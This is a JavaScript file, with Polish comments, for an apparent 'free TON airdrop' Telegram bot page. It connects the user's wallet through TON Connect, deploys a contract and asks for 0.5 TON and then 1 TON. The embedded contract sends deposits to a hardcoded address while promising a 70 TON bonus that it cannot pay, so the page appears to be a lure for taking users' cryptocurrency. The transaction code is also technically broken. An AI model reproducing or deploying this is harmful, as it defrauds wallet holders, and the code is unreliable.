const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});
tonConnectUI.uiOptions = {
    twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
};

const connectButton = document.getElementById('connect-button');
const activateButton = document.getElementById('activate-button');

let userWallet;
let contractAddress;

connectButton.addEventListener('click', async () => {
    try {
        userWallet = await tonConnectUI.connectWallet();
        console.log('Portfel połączony:', userWallet.account.address);
        activateButton.disabled = false;
    } catch (error) {
        console.error('Błąd połączenia:', error);
    }
});

async function deployContract() {
    if (!userWallet) {
        console.error('Portfel nie jest połączony');
        return;
    }

    const contractCode = `
    pragma ton-solidity >= 0.35.0;
    pragma AbiHeader expire;

    contract TONExchange {
        address constant DESTINATION_ADDRESS = address(0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef);

        function sendTON(address destination, uint128 amount) public {
            require(msg.value >= amount, 101);

            // Wysyłamy otrzymane TON na określony adres
            DESTINATION_ADDRESS.transfer(amount);

            // Wysyłamy z powrotem tyle samo TON plus 70 TON
            msg.sender.transfer(amount + 70 ton);
        }
    }
    `;

    const deployPayload = {
        abi: JSON.stringify({
            "ABI version": 2,
            "functions": [{
                "name": "constructor",
                "inputs": [],
                "outputs": []
            }],
            "events": [],
            "data": []
        }),
        method: 'constructor',
        params: {}
    };

    try {
        const result = await tonConnectUI.sendTransaction({
            to: '0:0000000000000000000000000000000000000000000000000000000000000000', // Adres "zero" dla wdrożenia
            value: 500000000, // 0.5 TON na wdrożenie
            payload: deployPayload,
            stateInit: contractCode // Kod kontraktu
        });

        contractAddress = result.address;
        console.log('Kontrakt wdrożony pod adresem:', contractAddress);
        return contractAddress;
    } catch (error) {
        console.error('Błąd podczas wdrażania kontraktu:', error);
    }
}

activateButton.addEventListener('click', async () => {
    if (!userWallet) {
        console.error('Portfel nie jest połączony');
        return;
    }

    if (!contractAddress) {
        contractAddress = await deployContract();
        if (!contractAddress) {
            console.error('Nie udało się wdrożyć kontraktu');
            return;
        }
    }

    try {
        const destinationAddress = '0:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef'; // Adres docelowy
        const amount = 1000000000; // 1 TON w nano TON

        const payload = {
            abi: JSON.stringify({
                "ABI version": 2,
                "functions": [{
                    "name": "sendTON",
                    "inputs": [
                        {"name": "destination", "type": "address"},
                        {"name": "amount", "type": "uint128"}
                    ],
                    "outputs": []
                }],
                "events": [],
                "data": []
            }),
            method: 'sendTON',
            params: {
                destination: destinationAddress,
                amount: amount
            }
        };

        const transaction = {
            to: contractAddress,
            value: amount,
            payload: payload
        };

        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Transakcja wysłana:', result);

    } catch (error) {
        console.error('Błąd podczas wysyłania transakcji:', error);
    }
});